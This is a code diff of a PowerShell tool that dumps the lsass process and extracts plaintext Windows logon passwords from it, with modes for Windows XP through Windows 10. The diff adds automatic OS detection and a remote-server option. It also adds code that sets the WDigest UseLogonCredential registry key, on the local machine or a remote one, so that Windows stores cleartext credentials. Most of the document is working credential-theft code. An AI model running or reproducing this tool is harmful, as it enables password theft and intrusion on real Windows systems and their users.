@@ -16,18 +16,10 @@
                     Add support for 2003 server
 .MODE
     1 --> Windows 7 + 2008r2
+    132  --> Windows 7 32 bits
     2 --> Windows 8 + 2012
-
-    2r2 --> Windows 2012r2 
-For 2012r2, you have to add this registry key UseLogonCredential (DWORD to set to 1) in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
-and then reboot.
-
-You have to dump the lsass process on the target machine and 
-then execute the script with option 
-* 2r2 
-* path\to\the\lsass.dmp (don't enter lsass.dmp, only the directory)
-
-
+    2r2 --> Windows 10 + 2012r2 
+    8.1 --> Win 8.1
     3 --> Windows 2003
 
 .DUMP
@@ -70,32 +62,19 @@ $fullScriptPath = (Resolve-Path -Path $DebuggingScript).Path
 $scriptName = [System.IO.Path]::GetFileName($scriptFile)
 $scriptVersion = "0.1"
 
-Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
-
-$mode = Read-Host 'Mode (1, 132, 2, 2r2 or 3)?'
-$dump = Read-Host 'gen = local credentials dump __ or __ file name of a dump __ or __ nothing -> ""'
-$server = Read-Host 'Name of the remote server (if second parameter = "")'
-if($mode -eq "2r2") {
-    $CdbProgramPath = "$scriptPath\debugger\2r2\cdb.exe"
-}
-else {
-    $CdbProgramPath = "$scriptPath\debugger\pre2r2\cdb.exe"
-}
-if($dump -eq "" -or $dump -eq "gen"){
-    if(!(Test-Path $logDirectoryPath)) {
-        New-Item $logDirectoryPath -type directory | Out-Null
-        Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
-    }
-}
-else {
-    $logDirectoryPath = $dump
+if(!(Test-Path $logDirectoryPath)) {
+    New-Item $logDirectoryPath -type directory | Out-Null
+    Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
 }
 
 $logFileName = "Log_" + $launchDate + ".log"
 $logPathName = "$logDirectoryPath\$logFileName"
 
 $global:streamWriter = New-Object System.IO.StreamWriter $logPathName
-
+<#
+$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name 
+$currentDomain = Get-DistinguishedNameFromFQDN $currentDomain
+#>
 #-----------------------------------------------------------[Functions]------------------------------------------------------------
 
 function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
@@ -167,8 +146,13 @@ function Write-Minidump ($process, $dumpFilePath) {
     $processDumpPath = "$dumpFilePath\$processFileName"
 
     $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
-
+    try{
     $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
+    }
+    catch{
+        $_.Exception()
+    }
+
     $fileStream.Close()       
 }
 
@@ -521,6 +505,50 @@ function XP_LsaDecryptMemory($DESXKeyHex, $g_Feedback, $cipherToDecrypt) {
     return $decrypted    
 }
 
+# ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+# Function Name 'Get-DistinguishedNameFromFQDN' - Convert domain name into distinguished name
+# ________________________________________________________________________
+function Get-DistinguishedNameFromFQDN {
+	param([string]$domainFullQualifiedDomain=(throw "You must specify the domain Full Qualified Name !"))
+    Begin{
+        Write-Log -streamWriter $global:streamWriter -infoToLog "Get distinguished name from domain name"
+    }
+    Process{
+        Try{
+            $distinguishedName = "" 
+	        $obj = $domainFullQualifiedDomain.Replace(',','\,').Split('/')
+	        $obj[0].split(".") | ForEach-Object { $distinguishedName += ",DC=" + $_}
+	        $distinguishedName = $distinguishedName.Substring(1)
+            Write-Log -streamWriter $global:streamWriter -infoToLog "Domain name is $domainFullQualifiedDomain, distinguished name is $distinguishedName"
+	        return $distinguishedName
+        }    
+        Catch{
+            Write-Error -streamWriter $global:streamWriter -errorCaught $_.Exception -forceExit $True
+            Break
+        }
+    }  
+    End{
+        If($?){
+            Write-Log -streamWriter $global:streamWriter -infoToLog "Completed Successfully."
+            Write-Log -streamWriter $global:streamWriter -infoToLog " "
+        }
+    }  	
+}
+# ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+# Function Name 'Stop-Script' - Stop the script execution
+# ________________________________________________________________________
+
+function Stop-Script () {   
+    Begin{
+        Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
+    }
+    Process{        
+        "Script terminating..." 
+        End-Log -streamWriter $global:streamWriter       
+        Exit
+    }
+}
+
 #----------------------------------------------------------[Execution]----------------------------------------------------------
 Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
 <#
@@ -530,6 +558,134 @@ $valueRegistryKey = "1"
 
 Set-RegistryKey $Server $parentKey $nameRegistryKey $valueRegistryKey)
 #>
+
+Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
+$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ? (local, remote, dump)'
+switch ($remoteLocalFile){
+    "local" {$dump = "gen"}
+    "remote" {$dump = "remote"}
+    "dump" {$dump = "dump"}
+    default {Write-Output "The option could not be determined... generate local dump"}
+}
+
+$osArchitecture = ""
+$operatingSystem = ""
+if($dump -eq "dump") {
+    $dump = Read-Host 'Enter the directory path of your lsass process dump (lsass.dmp)'
+    $mode = Read-Host 'Mode (1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 8.1 (Win 8.1) or 3 (Windows 2003))?'
+    switch ($mode){
+        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
+        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
+        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
+        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
+        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
+        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
+        default {
+                Write-Output "The mode could not be determined... terminating"
+                Stop-Script
+        }
+    }
+}
+else {
+    if($dump -eq "remote") { 
+        $dump = ""
+        $server = Read-Host 'Enter the name of the remote server'
+        $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
+        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture
+    }
+    else {
+        $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
+        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+    }
+    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
+        $mode = 3
+    }
+    else {
+        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
+            if($osArchitecture -eq "64 bits") {
+                $mode = 1
+            }
+            else {
+                $mode = 132
+            }
+        }
+        else {
+            if($operatingSystem -eq "6.2.9200"){
+                $mode = 2
+            }
+            else{
+                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){    
+                    $mode = "2r2"
+                }
+            }
+        }
+    }
+}
+
+if($mode -eq "2r2") {
+    $CdbProgramPath = "$scriptPath\debugger\2r2\cdb.exe"
+<#________________________________________________________________________
+
+Manage wdigest protocol in registry (local and remote if needed)
+__________________________________________________________________________#>
+
+    if($dump -eq "" -or $dump -eq "gen") {
+        $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+        $nameRegistryKey = "UseLogonCredential"
+        $valueRegistryKey = "1"
+        if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){
+            #Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey        
+            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
+            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+            Stop-Script
+        }
+        else {
+            $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
+            if($valueSetted -ne 1) {
+                New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
+                Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+                Stop-Script
+            }
+        }
+    }
+    else {
+        $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
+        $nameRegistryKey = "UseLogonCredential"
+        $valueRegistryKey = "1"
+
+        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $strMachineName)
+        $objRegKey= $objReg.OpenSubKey($parentKey)
+        $test = $objRegkey.GetValue($nameRegistryKey)
+        if($test -eq $null){    
+            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
+            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+            Stop-Script
+        }
+        else {
+            if($test -ne 1){
+                Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
+                Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+                Stop-Script
+            }
+        }
+    }
+
+}
+else {
+    $CdbProgramPath = "$scriptPath\debugger\pre2r2\cdb.exe"
+}
+
+<#
+if($dump -eq "" -or $dump -eq "gen"){
+    if(!(Test-Path $logDirectoryPath)) {
+        New-Item $logDirectoryPath -type directory | Out-Null
+        Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
+    }
+}
+else {
+    $logDirectoryPath = $dump
+}#>
+
 <#________________________________________________________________________
 
     Set the environment for the symbols
@@ -871,7 +1027,12 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
         $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
 
-        $loginPlainText = $loginPlainText1
+        $loginPlainText = $loginPlainText1        
+
+        #$user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText} -SearchBase $currentDomain -Properties *;
+        #$GroupMembership = ($user.memberof | % { (Get-ADGroup $_).Name; }) -join ';';        
+
+        $loginPlainText = $loginPlainText #+ $GroupMembership
 
         # Password
         Write-Progress -Activity "Getting password information" -status "Running..." -id 1         
